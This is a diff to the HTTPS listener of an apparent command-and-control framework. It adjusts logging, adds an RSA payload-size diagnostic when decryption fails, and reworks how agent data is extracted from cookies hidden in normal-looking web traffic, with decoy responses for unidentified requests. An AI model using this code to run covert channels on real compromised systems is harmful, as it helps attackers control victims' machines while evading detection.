@@ -146,8 +146,8 @@ class HttpsListener(BaseListener):
 
     async def _handle_request(self, request: web.Request) -> web.Response:
         try:
-            log.info(f"[request] {request.method} {request.path} from {request.remote} "
-                     f"headers={dict(request.headers)}")
+            log.debug(f"[request] {request.method} {request.path} from {request.remote} "
+                      f"headers={dict(request.headers)}")
 
             # Extract C2 data from the request per malleable profile
             raw_data = await self._extract_request_data(request)
@@ -175,10 +175,15 @@ class HttpsListener(BaseListener):
             agent_id, plaintext = self._decrypt_and_identify(encrypted_payload)
 
             if plaintext is None:
+                rsa_size_note = ""
+                if self._rsa_private_key and len(encrypted_payload) != 256:
+                    rsa_size_note = (f" — RSA-2048 expects 256 bytes but got {len(encrypted_payload)}, "
+                                    f"raw_data={len(raw_data)} size_field={size}")
                 log.warning(f"[request] decryption failed — could not identify agent "
                            f"(payload {len(encrypted_payload)} bytes, "
                            f"sessions={len(list(self.session_manager.all_sessions()))}, "
-                           f"rsa_key={'yes' if self._rsa_private_key else 'NO'})")
+                           f"rsa_key={'yes' if self._rsa_private_key else 'NO'}"
+                           f"{rsa_size_note})")
                 return await self._handle_decoy(request)
 
             log.info(f"[request] identified agent {agent_id[:8]}, plaintext {len(plaintext)} bytes")
@@ -221,7 +226,22 @@ class HttpsListener(BaseListener):
                 return self.profile.decode_data(body.decode("latin-1"), emb)
 
         if emb.location == "cookie":
-            cookie_val = request.cookies.get(emb.param_name, "")
+            # Extract cookie value from raw header instead of request.cookies
+            # to avoid Python's SimpleCookie parser truncating base64url values
+            raw_cookie = request.headers.get("Cookie", "")
+            if not raw_cookie:
+                return None
+            prefix = f"{emb.param_name}="
+            idx = raw_cookie.find(prefix)
+            if idx == -1:
+                log.debug(f"[extract] cookie '{emb.param_name}' not found in: {raw_cookie[:80]}")
+                return None
+            start = idx + len(prefix)
+            end = raw_cookie.find(";", start)
+            if end == -1:
+                end = len(raw_cookie)
+            cookie_val = raw_cookie[start:end].strip()
+            log.debug(f"[extract] raw cookie value len={len(cookie_val)}")
             if not cookie_val:
                 return None
             return self.profile.decode_data(cookie_val, emb)
